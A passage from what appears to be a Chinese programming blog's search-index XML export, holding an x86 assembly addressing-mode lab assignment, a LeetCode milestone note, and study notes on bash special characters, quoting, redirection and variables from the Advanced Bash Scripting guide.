&#x57FA;&#x5740;&#x53D8;&#x5740;&#x5BFB;&#x5740;&#x65B9;&#x5F0F;&#x64CD;&#x4F5C;&#x6570;&#x5B58;&#x653E;&#x5728;&#x5185;&#x5B58;&#x4E2D;&#x3002;&#x6307;&#x4EE4;&#x5F62;&#x5F0F;&#x5982;&#xFF1A; MOV AX&#xFF0C;[BX+SI]&#x64CD;&#x4F5C;&#x6570;&#x7684;EA&#x4E3A;&#x4E00;&#x4E2A;&#x57FA;&#x5740;&#x5BC4;&#x5B58;&#x5668;&#x548C;&#x4E00;&#x4E2A;&#x53D8;&#x5740;&#x5BC4;&#x5B58;&#x5668;&#x7684;&#x5185;&#x5BB9;&#x4E4B;&#x548C;&#x3002; &#x76F8;&#x5BF9;&#x57FA;&#x5740;&#x53D8;&#x5740;&#x5BFB;&#x5740;&#x65B9;&#x5F0F;&#x64CD;&#x4F5C;&#x6570;&#x5B58;&#x653E;&#x5728;&#x5185;&#x5B58;&#x4E2D;&#x3002;&#x6307;&#x4EE4;&#x5F62;&#x5F0F;&#x5982;&#xFF1A; MOV AX&#xFF0C;[BX+SI+1200H]&#x64CD;&#x4F5C;&#x6570;&#x7684;EA&#x4E3A;&#x4E00;&#x4E2A;&#x57FA;&#x5740;&#x5BC4;&#x5B58;&#x5668;&#x52A0;&#x4E00;&#x4E2A;&#x53D8;&#x5740;&#x5BC4;&#x5B58;&#x5668;&#x518D;&#x52A0;&#x4E00;&#x4E2A;&#x4F4D;&#x79FB;&#x91CF;&#xFF0C;&#x4E09;&#x8005;&#x4E4B;&#x548C;&#x3002;&#x53EF;&#x7528;&#x4E8E;&#x4E8C;&#x7EF4;&#x8868;&#x67E5;&#x8868;&#x548C;&#x6808;&#x5904;&#x7406;&#x3002; &#x5B9E;&#x9A8C;&#x4EFB;&#x52A1; &#x5B9E;&#x9A8C;&#x76EE;&#x7684; &#x901A;&#x8FC7;&#x5B9E;&#x9A8C;&#x89C2;&#x5BDF;&#x548C;&#x5206;&#x6790;&#x5728;&#x4E0D;&#x540C;&#x7684;&#x5BFB;&#x5740;&#x65B9;&#x5F0F;&#x4E0B;&#x5B58;&#x50A8;&#x5355;&#x5143;&#x903B;&#x8F91;&#x5730;&#x5740;&#x7684;&#x8868;&#x793A;&#x4EE5;&#x53CA;&#x6307;&#x4EE4;&#x7684;&#x6267;&#x884C;&#x7ED3;&#x679C;&#x3002;&#x719F;&#x7EC3;&#x638C;&#x63E1;DEBUG&#x7684;R&#x547D;&#x4EE4;&#x3001;A&#x547D;&#x4EE4;&#x3001;T&#x547D;&#x4EE4;&#x548C;D&#x547D;&#x4EE4;&#x7684;&#x7528;&#x6CD5;&#x3002; &#x5B9E;&#x9A8C;&#x5185;&#x5BB9; &#x53C2;&#x8003;&#x793A;&#x4F8B;&#x4E00;&#x548C;&#x5404;&#x79CD;&#x5BFB;&#x5740;&#x65B9;&#x5F0F;&#x5B8C;&#x6210;&#x4E0B;&#x5217;&#x5B9E;&#x9A8C;&#x5185;&#x5BB9;&#xFF1A; &#xFF08;1&#xFF09;&#x4E24;&#x4E2A;&#x64CD;&#x4F5C;&#x6570;&#x76F8;&#x51CF;&#x8FD0;&#x7B97;&#xFF0C;&#x7ED3;&#x679C;&#x653E;&#x5728;&#x6570;&#x636E;&#x6BB5;&#x7684;16&#x53F7;&#x5355;&#x5143;&#x3002; 1&#xFF09;AX&#x3001;BX&#x5BC4;&#x5B58;&#x5668;&#x5206;&#x522B;&#x8D4B;&#x503C;&#x4E3A;0008H&#x548C;0010H&#x3002;2&#xFF09;AX&#x548C;BX&#x7684;&#x5185;&#x5BB9;&#x76F8;&#x51CF;&#xFF08;SUB&#x6307;&#x4EE4;&#xFF09;&#xFF0C;&#x7ED3;&#x679C;&#x5728;AX&#x4E2D;&#x3002;3&#xFF09;&#x7528;&#x76F4;&#x63A5;&#x5BFB;&#x5740;&#x65B9;&#x5F0F;&#x5C06;&#x76F8;&#x51CF;&#x7684;&#x7ED3;&#x679C;&#x4FDD;&#x5B58;&#x5230;16&#x53F7;&#x5355;&#x5143;&#x3002; &#xFF08;2&#xFF09;&#x4E24;&#x4E2A;&#x64CD;&#x4F5C;&#x6570;&#x76F8;&#x52A0;&#x8FD0;&#x7B97;&#xFF0C;&#x7ED3;&#x679C;&#x653E;&#x5728;&#x9644;&#x52A0;&#x6BB5;&#x7684;0020H&#x53F7;&#x5355;&#x5143;&#x3002; 1&#xFF09;AX&#x7684;&#x503C;&#x4E3A;0034H&#x3002;2&#xFF09;AX&#x548C;65&#x76F8;&#x52A0;&#xFF0C;&#x7ED3;&#x679C;&#x5728;AX&#x4E2D;&#x3002;3&#xFF09;&#x7528;&#x5BC4;&#x5B58;&#x5668;&#x95F4;&#x63A5;&#x5BFB;&#x5740;&#x65B9;&#x5F0F;&#xFF08;&#x6BB5;&#x8D85;&#x8D8A;&#xFF09;&#x4FDD;&#x5B58;&#x8FD0;&#x7B97;&#x7ED3;&#x679C;&#x3002; &#xFF08;3&#xFF09;&#x5C06;AX&#x5BC4;&#x5B58;&#x5668;&#x4E2D;&#x7684;1234H&#x5199;&#x5165;&#x6570;&#x636E;&#x6BB5;&#x7684;2&#x53F7;&#x5355;&#x5143;&#xFF0C;&#x8BFB;&#x51FA;3&#x53F7;&#x5355;&#x5143;&#x7684;12H&#x4F20;&#x9001;&#x7ED9;BL&#x5BC4;&#x5B58;&#x5668;&#x3002;&#xFF08;&#x5BFB;&#x5740;&#x65B9;&#x5F0F;&#x81EA;&#x5B9A;&#xFF09; &#x5B9E;&#x9A8C;&#x8981;&#x6C42; &#xFF08;1&#xFF09;&#x5199;&#x51FA;&#x76F8;&#x5173;&#x547D;&#x4EE4;&#x53CA;&#x64CD;&#x4F5C;&#x6B65;&#x9AA4;&#xFF08;2&#xFF09;&#x5B9E;&#x9A8C;&#x5185;&#x5BB9;&#x7528;&#x622A;&#x56FE;&#x5F62;&#x5F0F;&#x8BB0;&#x5F55;&#x5B9E;&#x9A8C;&#x7ED3;&#x679C;&#xFF08;3&#xFF09;&#x5199;&#x51FA;&#x5B9E;&#x9A8C;&#x7ED3;&#x679C;&#x5206;&#x6790;&#x3002; document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>assembly</category>
      </categories>
      <tags>
        <tag>assembly</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[leetcode commemoration day]]></title>
    <url>%2F2018%2F10%2F24%2Fleetcode-commemoration-day%2F</url>
    <content type="text"><![CDATA[100&#x9898;&#x7EAA;&#x5FF5;&#xFF1A; document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>commemoration day</category>
      </categories>
      <tags>
        <tag>commemoration day</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Advanced bash scripting guide]]></title>
    <url>%2F2018%2F10%2F21%2FAdvanced-bash-scripting-guide%2F</url>
    <content type="text"><![CDATA[1.&#x4F7F;&#x7528;&#x811A;&#x672C;&#x6E05;&#x9664;&#x6587;&#x4EF6;123456789101112#!/bin/bash# &#x521D;&#x59CB;&#x5316;&#x4E00;&#x4E2A;&#x53D8;&#x91CF;LOG_DIR=/var/logcd $LOG_DIRcat /dev/null &gt; wtmpecho &quot;Logs cleaned up.&quot;exit 2.&#x547D;&#x4EE4;&#x5206;&#x9694;&#x7B26; 12345678#!/bin/bashecho hello; echo therefilename=ttt.shif [ -e &quot;$filename&quot; ]; then # &#x6CE8;&#x610F;: &quot;if&quot;&#x548C;&quot;then&quot;&#x9700;&#x8981;&#x5206;&#x9694;&#xFF0C;-e&#x7528;&#x4E8E;&#x5224;&#x65AD;&#x6587;&#x4EF6;&#x662F;&#x5426;&#x5B58;&#x5728; echo &quot;File $filename exists.&quot;; cp $filename $filename.bakelse echo &quot;File $filename not found.&quot;; touch $filenamefi; echo &quot;File test complete.&quot; 3.&#x7EC8;&#x6B62;case&#x9009;&#x9879;&#xFF08;&#x53CC;&#x5206;&#x53F7;&#xFF09;12345678#!/bin/bashvarname=bcase &quot;$varname&quot; in [a-z]) echo &quot;abc&quot;;; [0-9]) echo &quot;123&quot;;;esac 4.&#x7B49;&#x4EF7;&#x4E8E; source &#x547D;&#x4EE4;1234$ source test.shHello World$ . test.shHello World 5.&#x53CC;&#x5F15;&#x53F7;&#xFF08;&#x201D;)&#x201C;STRING&#x201D; &#x5C06;&#x4F1A;&#x963B;&#x6B62;&#xFF08;&#x89E3;&#x91CA;&#xFF09;STRING&#x4E2D;&#x5927;&#x90E8;&#x5206;&#x7279;&#x6B8A;&#x7684;&#x5B57;&#x7B26;&#x3002;&#x540E;&#x9762;&#x7684;&#x5B9E;&#x9A8C;&#x4F1A;&#x8BE6;&#x7EC6;&#x8BF4;&#x660E;&#x3002; 6.&#x5355;&#x5F15;&#x53F7;&#xFF08;&#x2019;&#xFF09;&#x2018;STRING&#x2019; &#x5C06;&#x4F1A;&#x963B;&#x6B62;STRING&#x4E2D;&#x6240;&#x6709;&#x7279;&#x6B8A;&#x5B57;&#x7B26;&#x7684;&#x89E3;&#x91CA;&#xFF0C;&#x8FD9;&#x662F;&#x4E00;&#x79CD;&#x6BD4;&#x4F7F;&#x7528;&#x201D;&#x66F4;&#x5F3A;&#x70C8;&#x7684;&#x5F62;&#x5F0F;&#x3002;&#x540E;&#x9762;&#x7684;&#x5B9E;&#x9A8C;&#x4F1A;&#x8BE6;&#x7EC6;&#x8BF4;&#x660E;&#x3002; &#x533A;&#x522B;&#xFF1A;1234567HOME=&apos;shiyanlou&apos;echo $HOME&gt;&gt; shiyanlouecho &apos;$HOME&apos;&gt;&gt; &apos;$HOME&apos;echo &quot;$HOME&quot;&gt;&gt; shiyanlou 7.&#x659C;&#x7EBF;&#xFF08;/&#xFF09;&#x6587;&#x4EF6;&#x540D;&#x8DEF;&#x5F84;&#x5206;&#x9694;&#x7B26;&#x3002;&#x5206;&#x9694;&#x6587;&#x4EF6;&#x540D;&#x4E0D;&#x540C;&#x7684;&#x90E8;&#x5206;&#xFF08;&#x5982;/home/bozo/projects/Makefile&#xFF09;&#x3002;&#x4E5F;&#x53EF;&#x4EE5;&#x7528;&#x6765;&#x4F5C;&#x4E3A;&#x9664;&#x6CD5;&#x7B97;&#x672F;&#x64CD;&#x4F5C;&#x7B26;&#x3002;&#x6CE8;&#x610F;&#x5728;linux&#x4E2D;&#x8868;&#x793A;&#x8DEF;&#x5F84;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x8BB8;&#x591A;&#x4E2A;/&#x8DDF;&#x4E00;&#x4E2A;/&#x662F;&#x4E00;&#x6837;&#x7684;&#x3002;/home/shiyanlou&#x7B49;&#x540C;&#x4E8E;////home///shiyanlou 8.&#x53CD;&#x659C;&#x7EBF;&#xFF08;\&#xFF09;&#x4E00;&#x79CD;&#x5BF9;&#x5355;&#x5B57;&#x7B26;&#x7684;&#x5F15;&#x7528;&#x673A;&#x5236;&#x3002;\X &#x5C06;&#x4F1A;&#x201C;&#x8F6C;&#x4E49;&#x201D;&#x5B57;&#x7B26;X&#x3002;&#x8FD9;&#x7B49;&#x4EF7;&#x4E8E;&#x201D;X&#x201D;&#xFF0C;&#x4E5F;&#x7B49;&#x4EF7;&#x4E8E;&#x2019;X&#x2019;&#x3002;\ &#x901A;&#x5E38;&#x7528;&#x6765;&#x8F6C;&#x4E49;&#x53CC;&#x5F15;&#x53F7;&#xFF08;&#x201D;&#xFF09;&#x548C;&#x5355;&#x5F15;&#x53F7;&#xFF08;&#x2019;&#xFF09;&#xFF0C;&#x8FD9;&#x6837;&#x53CC;&#x5F15;&#x53F7;&#x548C;&#x5355;&#x5F15;&#x53F7;&#x5C31;&#x4E0D;&#x4F1A;&#x88AB;&#x89E3;&#x91CA;&#x6210;&#x7279;&#x6B8A;&#x542B;&#x4E49;&#x4E86;&#x3002; &#x7B26;&#x53F7; &#x8BF4;&#x660E;\n &#x8868;&#x793A;&#x65B0;&#x7684;&#x4E00;&#x884C;\r &#x8868;&#x793A;&#x56DE;&#x8F66;\t &#x8868;&#x793A;&#x6C34;&#x5E73;&#x5236;&#x8868;&#x7B26;\v &#x8868;&#x793A;&#x5782;&#x76F4;&#x5236;&#x8868;&#x7B26;\b &#x8868;&#x793A;&#x540E;&#x9000;&#x7B26;\a &#x8868;&#x793A;&#x201D;alert&#x201D;(&#x8702;&#x9E23;&#x6216;&#x8005;&#x95EA;&#x70C1;)\0xx &#x8F6C;&#x6362;&#x4E3A;&#x516B;&#x8FDB;&#x5236;&#x7684;ASCII&#x7801;, &#x7B49;&#x4EF7;&#x4E8E;0xx&#x201C; &#x8868;&#x793A;&#x5F15;&#x53F7;&#x5B57;&#x9762;&#x7684;&#x610F;&#x601D;&#x8F6C;&#x4E49;&#x7B26;&#x4E5F;&#x63D0;&#x4F9B;&#x7EED;&#x884C;&#x529F;&#x80FD;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x7F16;&#x5199;&#x591A;&#x884C;&#x547D;&#x4EE4;&#x7684;&#x529F;&#x80FD;&#x3002; 9.&#x547D;&#x4EE4;&#x66FF;&#x6362;&#x53CD;&#x5F15;&#x53F7;&#x4E2D;&#x7684;&#x547D;&#x4EE4;&#x4F1A;&#x4F18;&#x5148;&#x6267;&#x884C;&#xFF0C;&#x5982;&#xFF1A;12$ cp `mkdir back` test.sh back$ ls &#x5148;&#x521B;&#x5EFA;&#x4E86; back &#x76EE;&#x5F55;&#xFF0C;&#x7136;&#x540E;&#x590D;&#x5236; test.sh &#x5230; back &#x76EE;&#x5F55; 10.&#x7A7A;&#x547D;&#x4EE4;(:)&#x7B49;&#x4EF7;&#x4E8E;&#x201C;NOP&#x201D;&#xFF08;no op&#xFF0C;&#x4E00;&#x4E2A;&#x4EC0;&#x4E48;&#x4E5F;&#x4E0D;&#x5E72;&#x7684;&#x547D;&#x4EE4;&#xFF09;&#x3002;&#x4E5F;&#x53EF;&#x4EE5;&#x88AB;&#x8BA4;&#x4E3A;&#x4E0E;shell&#x7684;&#x5185;&#x5EFA;&#x547D;&#x4EE4;true&#x4F5C;&#x7528;&#x76F8;&#x540C;&#x3002;&#x201C;:&#x201D;&#x547D;&#x4EE4;&#x662F;&#x4E00;&#x4E2A;bash&#x7684;&#x5185;&#x5EFA;&#x547D;&#x4EE4;&#xFF0C;&#x5B83;&#x7684;&#x9000;&#x51FA;&#x7801;&#xFF08;exit status&#xFF09;&#x662F;&#xFF08;0&#xFF09;&#x3002; &#x5982;&#xFF1A;123456#!/bin/bashwhile :do echo &quot;endless loop&quot;done &#x7B49;&#x4EF7;&#x4E8E;123456#!/bin/bashwhile truedo echo &quot;endless loop&quot;done &#x53EF;&#x4EE5;&#x5728; if/then &#x4E2D;&#x4F5C;&#x5360;&#x4F4D;&#x7B26;&#xFF1A;123456789#!/bin/bashcondition=5if [ $condition -gt 0 ] #gt&#x8868;&#x793A;greater than&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x5927;&#x4E8E;&#xFF0C;&#x540C;&#x6837;&#x6709;-lt&#xFF08;&#x5C0F;&#x4E8E;&#xFF09;&#xFF0C;-eq&#xFF08;&#x7B49;&#x4E8E;&#xFF09; then : # &#x4EC0;&#x4E48;&#x90FD;&#x4E0D;&#x505A;&#xFF0C;&#x9000;&#x51FA;&#x5206;&#x652F;else echo &quot;$condition&quot;fi 11.&#x53D8;&#x91CF;&#x6269;&#x5C55;/&#x5B50;&#x4E32;&#x66FF;&#x6362;&#x5728;&#x4E0E;&gt;&#x91CD;&#x5B9A;&#x5411;&#x64CD;&#x4F5C;&#x7B26;&#x7ED3;&#x5408;&#x4F7F;&#x7528;&#x65F6;&#xFF0C;&#x5C06;&#x4F1A;&#x628A;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#x6E05;&#x7A7A;&#xFF0C;&#x4F46;&#x662F;&#x5E76;&#x4E0D;&#x4F1A;&#x4FEE;&#x6539;&#x8FD9;&#x4E2A;&#x6587;&#x4EF6;&#x7684;&#x6743;&#x9650;&#x3002;&#x5982;&#x679C;&#x4E4B;&#x524D;&#x8FD9;&#x4E2A;&#x6587;&#x4EF6;&#x5E76;&#x4E0D;&#x5B58;&#x5728;&#xFF0C;&#x90A3;&#x4E48;&#x5C31;&#x521B;&#x5EFA;&#x8FD9;&#x4E2A;&#x6587;&#x4EF6;&#x3002;123$ : &gt; test.sh # &#x6587;&#x4EF6;&#x201C;test.sh&#x201D;&#x73B0;&#x5728;&#x88AB;&#x6E05;&#x7A7A;&#x4E86;# &#x4E0E; cat /dev/null &gt; test.sh &#x7684;&#x4F5C;&#x7528;&#x76F8;&#x540C;# &#x7136;&#x800C;,&#x8FD9;&#x5E76;&#x4E0D;&#x4F1A;&#x4EA7;&#x751F;&#x4E00;&#x4E2A;&#x65B0;&#x7684;&#x8FDB;&#x7A0B;, &#x56E0;&#x4E3A;&#x201C;:&#x201D;&#x662F;&#x4E00;&#x4E2A;&#x5185;&#x5EFA;&#x547D;&#x4EE4; 11.&#x6D4B;&#x8BD5;&#x64CD;&#x4F5C;&#x7B26;(?)12345#!/bin/basha=10(( t=a&lt;50?8:9 ))echo $t 12.&#x5C0F;&#x62EC;&#x53F7;&#xFF08;&#xFF09;1&#xFF09;&#x5C40;&#x90E8;&#x53D8;&#x91CF;123456#!/bin/basha=123( a=321; )echo &quot;$a&quot; #a&#x7684;&#x503C;&#x4E3A;123&#x800C;&#x4E0D;&#x662F;321&#xFF0C;&#x56E0;&#x4E3A;&#x62EC;&#x53F7;&#x5C06;&#x5224;&#x65AD;&#x4E3A;&#x5C40;&#x90E8;&#x53D8;&#x91CF; 2&#xFF09;&#x521D;&#x59CB;&#x5316;&#x6570;&#x7EC4;1234#!/bin/basharr=(1 4 5 7 9 21)echo ${arr[3]} # get a value of arr 13.&#x5927;&#x62EC;&#x53F7;{}1&#xFF09;&#x590D;&#x5236; t.txt &#x7684;&#x5185;&#x5BB9;&#x5230; t.back &#x4E2D;12345678#!/bin/bashif [ ! -w &apos;t.txt&apos; ];then touch t.txtfiecho &apos;test text&apos; &gt;&gt; t.txtcp t.{txt,back} 2&#xFF09;&#x4EE3;&#x7801;&#x5757;&#x4EE3;&#x7801;&#x5757;&#xFF0C;&#x53C8;&#x88AB;&#x79F0;&#x4E3A;&#x5185;&#x90E8;&#x7EC4;&#xFF0C;&#x8FD9;&#x4E2A;&#x7ED3;&#x6784;&#x4E8B;&#x5B9E;&#x4E0A;&#x521B;&#x5EFA;&#x4E86;&#x4E00;&#x4E2A;&#x533F;&#x540D;&#x51FD;&#x6570;&#xFF08;&#x4E00;&#x4E2A;&#x6CA1;&#x6709;&#x540D;&#x5B57;&#x7684;&#x51FD;&#x6570;&#xFF09;&#x3002;&#x7136;&#x800C;&#xFF0C;&#x4E0E;&#x201C;&#x6807;&#x51C6;&#x201D;&#x51FD;&#x6570;&#x4E0D;&#x540C;&#x7684;&#x662F;&#xFF0C;&#x5728;&#x5176;&#x4E2D;&#x58F0;&#x660E;&#x7684;&#x53D8;&#x91CF;&#xFF0C;&#x5BF9;&#x4E8E;&#x811A;&#x672C;&#x5176;&#x4ED6;&#x90E8;&#x5206;&#x7684;&#x4EE3;&#x7801;&#x6765;&#x8BF4;&#x8FD8;&#x662F;&#x53EF;&#x89C1;&#x7684;&#x3002;12345#!/bin/basha=123{ a=321; }echo &quot;a = $a&quot; result:a = 321 14.&#x4E2D;&#x62EC;&#x53F7;[]1)&#x6761;&#x4EF6;&#x6D4B;&#x8BD5;123456789#!/bin/basha=5if [ $a -lt 10 ]then echo &quot;a: $a&quot;else echo &apos;a&gt;10&apos;fi 2)&#x6570;&#x7EC4;&#x5143;&#x7D20;12345#!/bin/basharr=(12 22 32)arr[0]=10echo ${arr[0]} 15.&#x5C16;&#x62EC;&#x53F7;&lt;&gt;&#x91CD;&#x5B9A;&#x5411;test.sh &gt; filename&#xFF1A;&#x91CD;&#x5B9A;&#x5411;test.sh&#x7684;&#x8F93;&#x51FA;&#x5230;&#x6587;&#x4EF6; filename &#x4E2D;&#x3002;&#x5982;&#x679C; filename &#x5B58;&#x5728;&#x7684;&#x8BDD;&#xFF0C;&#x90A3;&#x4E48;&#x5C06;&#x4F1A;&#x88AB;&#x8986;&#x76D6;&#x3002; test.sh &amp;&gt; filename&#xFF1A;&#x91CD;&#x5B9A;&#x5411; test.sh &#x7684; stdout&#xFF08;&#x6807;&#x51C6;&#x8F93;&#x51FA;&#xFF09;&#x548C; stderr&#xFF08;&#x6807;&#x51C6;&#x9519;&#x8BEF;&#xFF09;&#x5230; filename &#x4E2D;&#x3002; test.sh &gt;&amp;2&#xFF1A;&#x91CD;&#x5B9A;&#x5411; test.sh &#x7684; stdout &#x5230; stderr &#x4E2D;&#x3002; test.sh &gt;&gt; filename&#xFF1A;&#x628A; test.sh &#x7684;&#x8F93;&#x51FA;&#x8FFD;&#x52A0;&#x5230;&#x6587;&#x4EF6; filename &#x4E2D;&#x3002;&#x5982;&#x679C;filename &#x4E0D;&#x5B58;&#x5728;&#x7684;&#x8BDD;&#xFF0C;&#x5C06;&#x4F1A;&#x88AB;&#x521B;&#x5EFA;&#x3002; 16.&#x7AD6;&#x7EBF;&#xFF08;|&#xFF09;&#x7BA1;&#x9053;&#x5206;&#x6790;&#x524D;&#x8FB9;&#x547D;&#x4EE4;&#x7684;&#x8F93;&#x51FA;&#xFF0C;&#x5E76;&#x5C06;&#x8F93;&#x51FA;&#x4F5C;&#x4E3A;&#x540E;&#x8FB9;&#x547D;&#x4EE4;&#x7684;&#x8F93;&#x5165;&#x3002;&#x8FD9;&#x662F;&#x4E00;&#x79CD;&#x4EA7;&#x751F;&#x547D;&#x4EE4;&#x94FE;&#x7684;&#x597D;&#x65B9;&#x6CD5;&#x3002;1234#!/bin/bashtr &apos;a-z&apos; &apos;A-Z&apos;exit 0 &#x73B0;&#x5728;&#x8BA9;&#x6211;&#x4EEC;&#x8F93;&#x9001;ls -l&#x7684;&#x8F93;&#x51FA;&#x5230;&#x4E00;&#x4E2A;&#x811A;&#x672C;&#x4E2D;&#xFF1A;12$ chmod 755 test26.sh$ ls -l | ./test26.sh &#x8F93;&#x51FA;&#x7684;&#x5185;&#x5BB9;&#x5747;&#x53D8;&#x4E3A;&#x4E86;&#x5927;&#x5199;&#x5B57;&#x6BCD;&#x3002; 17.&#x7834;&#x6298;&#x53F7;-1&#xFF09;&#x9009;&#x9879;&#xFF0C;&#x524D;&#x7F00;&#x5728;&#x6240;&#x6709;&#x7684;&#x547D;&#x4EE4;&#x5185;&#x5982;&#x679C;&#x60F3;&#x4F7F;&#x7528;&#x9009;&#x9879;&#x53C2;&#x6570;&#x7684;&#x8BDD;,&#x524D;&#x8FB9;&#x90FD;&#x8981;&#x52A0;&#x4E0A;&#x201C;-&#x201D;&#x3002;12345678#!/bin/basha=5b=5if [ &quot;$a&quot; -eq &quot;$b&quot; ]then echo &quot;a is equal to b.&quot;fi 2)&#x7528;&#x4E8E;&#x91CD;&#x5B9A;&#x5411;stdin&#x6216;stdout12345678910111213#!/bin/bashBACKUPFILE=backup-$(date +%m-%d-%Y)# &#x5728;&#x5907;&#x4EFD;&#x6587;&#x4EF6;&#x4E2D;&#x5D4C;&#x5165;&#x65F6;&#x95F4;.archive=${1:-$BACKUPFILE}# &#x5982;&#x679C;&#x5728;&#x547D;&#x4EE4;&#x884C;&#x4E2D;&#x6CA1;&#x6709;&#x6307;&#x5B9A;&#x5907;&#x4EFD;&#x6587;&#x4EF6;&#x7684;&#x6587;&#x4EF6;&#x540D;,# &#x90A3;&#x4E48;&#x5C06;&#x9ED8;&#x8BA4;&#x4F7F;&#x7528;&quot;backup-MM-DD-YYYY.tar.gz&quot;.tar cvf - `find . -mtime -1 -type f -print` &gt; $archive.targzip $archive.tarecho &quot;Directory $PWD backed up in archive file \&quot;$archive.tar.gz\&quot;.&quot;exit 0 18.&#x6CE2;&#x6D6A;&#x53F7;~&#x76EE;&#x5F55;~ &#x8868;&#x793A; home &#x76EE;&#x5F55;&#x3002; 21.&#x53EA;&#x8BFB;&#x53D8;&#x91CF;&#x4F7F;&#x7528; readonly &#x547D;&#x4EE4;&#x53EF;&#x4EE5;&#x5C06;&#x53D8;&#x91CF;&#x5B9A;&#x4E49;&#x4E3A;&#x53EA;&#x8BFB;&#x53D8;&#x91CF;&#xFF0C;&#x53EA;&#x8BFB;&#x53D8;&#x91CF;&#x7684;&#x503C;&#x4E0D;&#x80FD;&#x88AB;&#x6539;&#x53D8;&#x3002; &#x4E0B;&#x9762;&#x7684;&#x4F8B;&#x5B50;&#x5C1D;&#x8BD5;&#x66F4;&#x6539;&#x53EA;&#x8BFB;&#x53D8;&#x91CF;&#xFF0C;&#x7ED3;&#x679C;&#x62A5;&#x9519;&#xFF1A;1234#!/bin/bashmyUrl=&quot;http://www.shiyanlou.com&quot;readonly myUrlmyUrl=&quot;http://www.shiyanlou.com&quot; &#x8FD0;&#x884C;&#x811A;&#x672C;&#xFF0C;&#x7ED3;&#x679C;&#x5982;&#x4E0B;&#xFF1A; /bin/sh: NAME: This variable is read only. 22.&#x7279;&#x6B8A;&#x53D8;&#x91CF;1)&#x5C40;&#x90E8;&#x53D8;&#x91CF;&#x8FD9;&#x79CD;&#x53D8;&#x91CF;&#x53EA;&#x6709;&#x5728;&#x4EE3;&#x7801;&#x5757;&#x6216;&#x8005;&#x51FD;&#x6570;&#x4E2D;&#x624D;&#x53EF;&#x89C1;&#x3002;&#x540E;&#x9762;&#x7684;&#x5B9E;&#x9A8C;&#x4F1A;&#x8BE6;&#x7EC6;&#x8BB2;&#x89E3;&#x3002; 2)&#x73AF;&#x5883;&#x53D8;&#x91CF;&#x8FD9;&#x79CD;&#x53D8;&#x91CF;&#x5C06;&#x5F71;&#x54CD;&#x7528;&#x6237;&#x63A5;&#x53E3;&#x548C; shell &#x7684;&#x884C;&#x4E3A;&#x3002; &#x5728;&#x901A;&#x5E38;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x6BCF;&#x4E2A;&#x8FDB;&#x7A0B;&#x90FD;&#x6709;&#x81EA;&#x5DF1;&#x7684;&#x201C;&#x73AF;&#x5883;&#x201D;&#xFF0C;&#x8FD9;&#x4E2A;&#x73AF;&#x5883;&#x662F;&#x7531;&#x4E00;&#x7EC4;&#x53D8;&#x91CF;&#x7EC4;&#x6210;&#x7684;&#xFF0C;&#x8FD9;&#x4E9B;&#x53D8;&#x91CF;&#x4E2D;&#x5B58;&#x6709;&#x8FDB;&#x7A0B;&#x53EF;&#x80FD;&#x9700;&#x8981;&#x5F15;&#x7528;&#x7684;&#x4FE1;&#x606F;&#x3002;&#x5728;&#x8FD9;&#x79CD;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;shell &#x4E0E;&#x4E00;&#x4E2A;&#x4E00;&#x822C;&#x7684;&#x8FDB;&#x7A0B;&#x6CA1;&#x4EC0;&#x4E48;&#x533A;&#x522B;&#x3002; 3)&#x4F4D;&#x7F6E;&#x53C2;&#x6570;&#x4ECE;&#x547D;&#x4EE4;&#x884C;&#x4F20;&#x9012;&#x5230;&#x811A;&#x672C;&#x7684;&#x53C2;&#x6570;&#xFF1A;$0&#xFF0C;$1&#xFF0C;$2&#xFF0C;$3&#x2026; $0&#x5C31;&#x662F;&#x811A;&#x672C;&#x6587;&#x4EF6;&#x81EA;&#x8EAB;&#x7684;&#x540D;&#x5B57;&#xFF0C;$1 &#x662F;&#x7B2C;&#x4E00;&#x4E2A;&#x53C2;&#x6570;&#xFF0C;$2 &#x662F;&#x7B2C;&#x4E8C;&#x4E2A;&#x53C2;&#x6570;&#xFF0C;$3 &#x662F;&#x7B2C;&#x4E09;&#x4E2A;&#x53C2;&#x6570;&#xFF0C;&#x7136;&#x540E;&#x662F;&#x7B2C;&#x56DB;&#x4E2A;&#x3002;$9 &#x4E4B;&#x540E;&#x7684;&#x4F4D;&#x7F6E;&#x53C2;&#x6570;&#x5C31;&#x5FC5;&#x987B;&#x7528;&#x5927;&#x62EC;&#x53F7;&#x62EC;&#x8D77;&#x6765;&#x4E86;&#xFF0C;&#x6BD4;&#x5982;&#xFF0C;${10}&#xFF0C;${11}&#xFF0C;${12}&#x3002; $# &#xFF1A; &#x4F20;&#x9012;&#x5230;&#x811A;&#x672C;&#x7684;&#x53C2;&#x6570;&#x4E2A;&#x6570;$ &#xFF1A; &#x4EE5;&#x4E00;&#x4E2A;&#x5355;&#x5B57;&#x7B26;&#x4E32;&#x663E;&#x793A;&#x6240;&#x6709;&#x5411;&#x811A;&#x672C;&#x4F20;&#x9012;&#x7684;&#x53C2;&#x6570;&#x3002;&#x4E0E;&#x4F4D;&#x7F6E;&#x53D8;&#x91CF;&#x4E0D;&#x540C;,&#x6B64;&#x9009;&#x9879;&#x53C2;&#x6570;&#x53EF;&#x8D85;&#x8FC7; 9&#x4E2A;$$ &#xFF1A; &#x811A;&#x672C;&#x8FD0;&#x884C;&#x7684;&#x5F53;&#x524D;&#x8FDB;&#x7A0B; ID&#x53F7;$! &#xFF1A; 